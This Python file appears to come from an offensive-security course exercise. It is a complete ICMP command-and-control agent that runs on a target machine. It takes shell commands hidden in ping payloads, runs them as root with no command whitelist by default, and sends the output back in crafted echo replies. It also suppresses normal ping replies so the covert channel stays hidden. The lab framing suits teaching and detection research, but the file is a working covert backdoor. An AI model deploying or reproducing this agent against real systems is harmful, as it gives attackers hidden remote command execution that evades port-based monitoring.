#!/usr/bin/env python3
"""
Module 6 — Exercise 6-A: ICMP C2 Agent (Target / Victim Side)

Listens for ICMP echo requests containing encoded commands,
executes them via subprocess, and returns output in ICMP echo replies.

The agent runs silently with no open ports — it looks like a machine
responding to pings. Only observers watching ICMP payload contents
would notice the covert channel.

The agent temporarily sets icmp_echo_ignore_all=1 while running so its
Scapy-crafted replies (carrying command output) are the only ones the
attacker receives. Normal ping responses resume when the agent exits.

Usage (run on the target VM as root):
  sudo python3 module6/icmp_agent.py --iface eth0

  Then from the attacker:
  sudo python3 module6/icmp_tunnel.py --target 192.168.56.2
"""

import argparse
import signal
import subprocess
import sys
import threading
import time

from scapy.all import (
    IP, ICMP, Raw,
    sendp, Ether,
    sniff, AsyncSniffer,
    conf, get_if_hwaddr, getmacbyip,
)

conf.verb = 0
conf.iface = conf.route.route("192.168.56.0")[0]  # default to isolated lab NIC (not Vagrant NAT)

CHUNK_SIZE  = 48
MAX_OUTPUT  = 8192    # truncate command output to this many bytes
ALLOWED_CMDS = None   # None = allow all; set to a list to whitelist


# ── Encoding helpers (mirrors icmp_tunnel.py) ─────────────────────────────────

def encode_chunk(data: bytes, is_last: bool) -> bytes:
    marker = b"\x02" if is_last else b"\x01"
    return marker + data


def decode_chunk(payload: bytes) -> tuple[bytes, bool]:
    if not payload:
        return b"", True
    marker = payload[0]
    return payload[1:], (marker == 0x02 or marker == 0xFF)


# ── Session state ─────────────────────────────────────────────────────────────

# {session_id: {seq: chunk_bytes}}
pending_commands: dict[int, dict[int, bytes]] = {}
pending_lock = threading.Lock()


# ── Command execution ─────────────────────────────────────────────────────────

def run_command(cmd: str) -> bytes:
    """Execute a shell command and return output bytes (truncated)."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=15,
        )
        output = result.stdout + result.stderr
        if not output:
            output = f"[exit code {result.returncode}]".encode()
    except subprocess.TimeoutExpired:
        output = b"[command timed out after 15s]"
    except Exception as e:
        output = f"[error: {e}]".encode()

    return output[:MAX_OUTPUT]


# ── Send chunked response ─────────────────────────────────────────────────────

def send_icmp_response(dst_ip: str, session_id: int, output: bytes, iface: str):
    """
    Send output back to attacker as chunked ICMP echo replies.
    """
    chunks = [output[i:i+CHUNK_SIZE] for i in range(0, len(output), CHUNK_SIZE)]
    if not chunks:
        chunks = [b""]

    for seq, chunk in enumerate(chunks):
        is_last = (seq == len(chunks) - 1)
        payload = encode_chunk(chunk, is_last)

        pkt = (
            IP(dst=dst_ip)
            / ICMP(type=0, id=session_id, seq=seq)   # echo reply
            / Raw(load=payload)
        )

        from scapy.all import send
        send(pkt, verbose=False)
        time.sleep(0.03)


# ── Packet handler ────────────────────────────────────────────────────────────

def icmp_handler(pkt, iface: str):
    """
    Called for each ICMP echo request.
    Reassembles chunked commands and executes when last chunk arrives.
    """
    if not (pkt.haslayer(ICMP) and pkt.haslayer(Raw)):
        return
    if pkt[ICMP].type != 8:   # echo request only
        return

    icmp       = pkt[ICMP]
    session_id = icmp.id
    seq        = icmp.seq
    src_ip     = pkt[IP].src

    data, is_last = decode_chunk(pkt[Raw].load)

    with pending_lock:
        if session_id not in pending_commands:
            pending_commands[session_id] = {}
        pending_commands[session_id][seq] = data

        if is_last:
            # Reassemble command from all chunks for this session
            cmd_bytes = b"".join(
                pending_commands[session_id][s]
                for s in sorted(pending_commands[session_id])
            )
            del pending_commands[session_id]
            cmd = cmd_bytes.decode(errors="replace").strip()
        else:
            return   # more chunks expected

    if not cmd:
        return

    # Safety: skip obviously dangerous commands if whitelist active
    if ALLOWED_CMDS is not None and not any(cmd.startswith(c) for c in ALLOWED_CMDS):
        output = b"[command not allowed]"
    else:
        print(f"[*] Executing from {src_ip} [session=0x{session_id:04X}]: {cmd!r}")
        output = run_command(cmd)
        print(f"    → {len(output)} bytes output")

    # Send response in background thread to not block the sniffer
    t = threading.Thread(
        target=send_icmp_response,
        args=(src_ip, session_id, output, iface),
        daemon=True,
    )
    t.start()


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="ICMP C2 agent — run on target VM")
    parser.add_argument("--iface", default=conf.iface)
    args = parser.parse_args()

    # SIGTERM must also trigger the finally block (sys.exit raises SystemExit,
    # which is caught by finally just like KeyboardInterrupt).
    signal.signal(signal.SIGTERM, lambda sig, frame: sys.exit(0))

    print(f"[*] ICMP C2 Agent listening on {args.iface}")
    print("[*] Waiting for commands in ICMP echo request payloads...")
    print("[*] Press Ctrl-C to stop\n")

    # Suppress the kernel's automatic echo-reply so the agent's Scapy-crafted
    # reply (carrying command output) is the only one the attacker sees.
    _IGNORE_PATH = "/proc/sys/net/ipv4/icmp_echo_ignore_all"
    with open(_IGNORE_PATH) as _f:
        _saved = _f.read().strip()
    with open(_IGNORE_PATH, "w") as _f:
        _f.write("1\n")
    print("[*] Kernel ICMP echo-reply suppressed (icmp_echo_ignore_all=1)")

    try:
        sniff(
            iface=args.iface,
            filter="icmp",
            prn=lambda p: icmp_handler(p, args.iface),
            store=False,
        )
    except KeyboardInterrupt:
        print("\n[*] Agent stopped")
    finally:
        with open(_IGNORE_PATH, "w") as _f:
            _f.write(_saved + "\n")
        print(f"[*] Restored icmp_echo_ignore_all={_saved}")


if __name__ == "__main__":
    main()
